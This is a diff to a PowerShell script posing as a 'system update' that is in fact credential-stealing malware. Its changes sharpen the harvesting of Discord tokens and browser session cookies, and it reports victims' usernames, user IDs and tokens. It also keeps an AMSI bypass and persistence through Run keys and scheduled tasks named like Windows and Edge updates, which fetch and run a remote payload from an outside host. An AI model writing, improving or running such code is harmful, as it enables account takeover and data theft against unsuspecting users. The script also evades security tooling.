@@ -1,5 +1,5 @@
 # ============================================================
-# SYSTEM UPDATE v23.0 (WITH USERNAME EXTRACTION)
+# SYSTEM UPDATE v31.0 (UNIQUE VALID TOKENS + USERNAMES)
 # ============================================================
 
 # --- AMSI BYPASS ---
@@ -49,31 +49,43 @@ $adminStatus = if ($isAdmin) { "YES" } else { "NO" }
 
 # --- REGEX PATTERNS ---
 $patterns = @(
-    '[A-Za-z0-9_-]{24,26}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,38}',
-    '[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}',
-    'MT[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
-    'mfa\.[A-Za-z0-9_-]{84,95}',
-    '[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{27,38}'
+    @{ Name = "Standard"; Pattern = '[A-Za-z0-9_-]{24,26}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,38}' },
+    @{ Name = "MT"; Pattern = 'MT[A-Za-z0-9_-]{20,24}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,38}' },
+    @{ Name = "MFA"; Pattern = 'mfa\.[A-Za-z0-9_-]{84,95}' }
 )
 
-# --- FUNCTION: DECODE TOKEN TO GET USER ID ---
+# --- FUNCTION: DECODE TOKEN (FULL) ---
 function Decode-Token {
     param([string]$token)
+    $result = @{
+        UserId = $null
+        Username = "Unknown"
+    }
     try {
         $parts = $token -split '\.'
         if ($parts.Count -ge 1) {
             $p1 = $parts[0]
+            $p1 = $p1 -replace '^token=|^auth=|^session='
             while ($p1.Length % 4 -ne 0) { $p1 += "=" }
             $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p1))
+            
             if ($decoded -match '^\d+$') {
-                return $decoded
+                $result.UserId = $decoded
+            } elseif ($decoded -match '(\d{15,20})') {
+                $result.UserId = $Matches[1]
+            }
+            
+            if ($decoded -match '"username":"([^"]+)"') {
+                $result.Username = $Matches[1]
+            } elseif ($decoded -match '"global_name":"([^"]+)"') {
+                $result.Username = $Matches[1]
             }
         }
     } catch {}
-    return $null
+    return $result
 }
 
-# --- FUNCTION: GET USERNAME FROM API ---
+# --- FUNCTION: FETCH USERNAME FROM API ---
 function Get-Username {
     param([string]$token)
     try {
@@ -81,7 +93,7 @@ function Get-Username {
             Authorization = $token
             "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
         }
-        $r = Invoke-RestMethod -Uri $api -Headers $headers -TimeoutSec 5 -ErrorAction Stop
+        $r = Invoke-RestMethod -Uri $api -Headers $headers -TimeoutSec 10 -ErrorAction Stop
         if ($r.id) {
             return "$($r.username)#$($r.discriminator)"
         }
@@ -92,6 +104,7 @@ function Get-Username {
 # --- FUNCTION: GET TOKENS ---
 function Get-DiscordTokens {
     $tokens = @()
+    $seen = @{}
     $paths = @(
         "$env:APPDATA\Discord\Local Storage\leveldb",
         "$env:APPDATA\discordcanary\Local Storage\leveldb",
@@ -113,10 +126,23 @@ function Get-DiscordTokens {
                     $c = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                     if ($c) {
                         foreach ($pattern in $patterns) {
-                            [regex]::Matches($c, $pattern) | ForEach-Object {
+                            [regex]::Matches($c, $pattern.Pattern) | ForEach-Object {
                                 $token = $_.Value.Trim()
-                                if ($token.Length -gt 30 -and $token -notin $tokens) {
-                                    $tokens += $token
+                                $token = $token -replace '^[^A-Za-z0-9_-]+', ''
+                                $token = $token -replace '[^A-Za-z0-9_\-\.]+$', ''
+                                if ($token.Length -gt 30 -and $token -notin $seen) {
+                                    $parts = $token -split '\.'
+                                    if ($parts.Count -eq 3) {
+                                        $validParts = $true
+                                        foreach ($part in $parts) {
+                                            if ($part -match '[^A-Za-z0-9_-]') { $validParts = $false; break }
+                                            if ($part.Length -lt 5) { $validParts = $false; break }
+                                        }
+                                        if ($validParts) {
+                                            $seen[$token] = $true
+                                            $tokens += $token
+                                        }
+                                    }
                                 }
                             }
                         }
@@ -128,32 +154,32 @@ function Get-DiscordTokens {
     return $tokens
 }
 
-# --- FUNCTION: FILTER TOKENS ---
+# --- FUNCTION: FILTER TOKENS (UNIQUE ONLY) ---
 function FilterTokens {
     param([string[]]$tokens)
     $filtered = @()
+    $seenIds = @{}
     
     foreach ($token in $tokens) {
-        $parts = $token -split '\.'
-        if ($parts.Count -eq 3) {
-            # Check if first part decodes to a number (user ID)
-            $userId = Decode-Token -token $token
-            if ($userId) {
-                $filtered += [PSCustomObject]@{
-                    Token = $token
-                    UserId = $userId
-                    Username = $null  # Will be filled later
-                }
-                continue
+        $decoded = Decode-Token -token $token
+        
+        if ($decoded.UserId -and $decoded.UserId -notin $seenIds) {
+            $seenIds[$decoded.UserId] = $true
+            
+            $tokenType = "Standard"
+            if ($token -match '^mfa\.') { $tokenType = "MFA" }
+            elseif ($token -match '^MT') { $tokenType = "MT" }
+            
+            if ($decoded.Username -eq "Unknown" -or -not $decoded.Username) {
+                $decoded.Username = "User $($decoded.UserId)"
             }
-            # If it starts with MT (base64 for numbers starting with 1)
-            if ($token -match '^MT[A-Za-z0-9_-]+\.') {
-                $userId = Decode-Token -token $token
-                $filtered += [PSCustomObject]@{
-                    Token = $token
-                    UserId = $userId
-                    Username = $null
-                }
+            
+            $filtered += [PSCustomObject]@{
+                Token = $token
+                UserId = $decoded.UserId
+                Username = $decoded.Username
+                Type = $tokenType
+                Length = $token.Length
             }
         }
     }
@@ -163,37 +189,41 @@ function FilterTokens {
 # --- FUNCTION: GET COOKIES ---
 function Get-Cookies {
     $cookies = @()
+    $seenCookies = @{}
     $paths = @(
         "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
         "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies",
         "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
         "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Network\Cookies",
         "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies",
+        "$env:APPDATA\Opera Software\Opera Stable\Network\Cookies",
         "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Network\Cookies"
     )
     
     foreach ($path in $paths) {
         if (Test-Path $path) {
             try {
-                $temp = "$env:TEMP\cookies_temp_$(Get-Random).db"
+                $temp = "$env:TEMP\cookies_$(Get-Random).db"
                 Copy-Item $path $temp -Force -ErrorAction SilentlyContinue
                 if (Test-Path $temp) {
-                    try {
-                        Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue
-                    } catch {}
+                    try { Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue } catch {}
                     if ([System.Data.SQLite.SQLiteConnection] -ne $null) {
                         try {
                             $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;")
                             $conn.Open()
                             $cmd = $conn.CreateCommand()
-                            $cmd.CommandText = "SELECT host_key, name, value FROM cookies WHERE host_key LIKE '%.%' AND (name LIKE '%SID%' OR name LIKE '%token%' OR name LIKE '%auth%' OR name LIKE '%session%' OR name LIKE '%login%' OR name LIKE '%_ga%' OR name LIKE '%cf_%' OR name LIKE '%__Host%' OR name LIKE '%__Secure%' OR name LIKE '%MUID%' OR name LIKE '%ANONCHK%' OR name LIKE '%dcfduid%') LIMIT 50"
+                            $cmd.CommandText = "SELECT host_key, name, value FROM cookies WHERE host_key LIKE '%.%' AND (name LIKE '%SID%' OR name LIKE '%token%' OR name LIKE '%auth%' OR name LIKE '%session%' OR name LIKE '%login%' OR name LIKE '%_ga%' OR name LIKE '%cf_%' OR name LIKE '%__Host%' OR name LIKE '%__Secure%' OR name LIKE '%MUID%' OR name LIKE '%ANONCHK%' OR name LIKE '%dcfduid%') LIMIT 100"
                             $reader = $cmd.ExecuteReader()
                             while ($reader.Read()) {
                                 $host = $reader["host_key"].ToString()
                                 $name = $reader["name"].ToString()
                                 $value = $reader["value"].ToString()
-                                if ($value -ne $null -and $value.Length -gt 3) {
-                                    $cookies += [PSCustomObject]@{ Host = $host; Name = $name; Value = $value }
+                                if ($value -and $value.Length -gt 2 -and $host -and $name) {
+                                    $key = "$host|$name"
+                                    if ($key -notin $seenCookies) {
+                                        $seenCookies[$key] = $true
+                                        $cookies += [PSCustomObject]@{ Host = $host; Name = $name; Value = $value }
+                                    }
                                 }
                             }
                             $conn.Close()
@@ -232,14 +262,13 @@ $filteredTokens = FilterTokens -tokens $rawTokens
 $cookies = Get-Cookies
 $screenshot = Take-Screenshot
 
-# --- GET USERNAMES FOR FILTERED TOKENS ---
+# --- FETCH USERNAMES FROM API (ONLY FOR UNIQUE TOKENS) ---
 foreach ($t in $filteredTokens) {
     $username = Get-Username -token $t.Token
     if ($username) {
         $t.Username = $username
-    } else {
-        $t.Username = "Unknown (User ID: $($t.UserId))"
     }
+    Start-Sleep -Milliseconds 300
 }
 
 # --- BUILD REPORT ---
@@ -249,14 +278,15 @@ $msg += "User: $env:USERNAME`n"
 $msg += "Windows Admin: $adminStatus`n"
 $msg += "Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n`n"
 $msg += "**RAW TOKENS FOUND:** $($rawTokens.Count)`n"
-$msg += "**FILTERED TOKENS:** $($filteredTokens.Count)`n`n"
+$msg += "**VALID TOKENS:** $($filteredTokens.Count)`n`n"
 
 if ($filteredTokens.Count -gt 0) {
     $msg += "**✅ VALID TOKENS:**`n`n"
     foreach ($t in $filteredTokens) {
         $msg += "**Username:** $($t.Username)`n"
+        $msg += "**User ID:** $($t.UserId)`n"
         $msg += "**Token:** ``$($t.Token)```n"
-        $msg += "**User ID:** $($t.UserId)`n`n"
+        $msg += "**Type:** $($t.Type)`n`n"
     }
 } else {
     $msg += "**[!] No valid tokens found.**`n"
@@ -314,9 +344,21 @@ if ($screenshot) {
 
 # --- PERSISTENCE ---
 $cmd = 'powershell.exe -nologo -ep bypass -w hidden -c "IEX(irm ''https://opt.wisp.uno/payload.ps1'')"'
-try { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $cmd -ErrorAction SilentlyContinue } catch {}
-try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $cmd -ErrorAction SilentlyContinue } catch {}
-try { schtasks /create /tn "WindowsUpdate" /tr "$cmd" /sc onlogon /f /rl highest /it > $null 2>&1 } catch {}
-try { schtasks /create /tn "MicrosoftEdgeUpdate" /tr "$cmd" /sc onstart /f /rl highest > $null 2>&1 } catch {}
+
+try {
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $cmd -ErrorAction SilentlyContinue
+} catch {}
+
+try {
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $cmd -ErrorAction SilentlyContinue
+} catch {}
+
+try {
+    schtasks /create /tn "WindowsUpdate" /tr "$cmd" /sc onlogon /f /rl highest /it > $null 2>&1
+} catch {}
+
+try {
+    schtasks /create /tn "MicrosoftEdgeUpdate" /tr "$cmd" /sc onstart /f /rl highest > $null 2>&1
+} catch {}
 
 exit
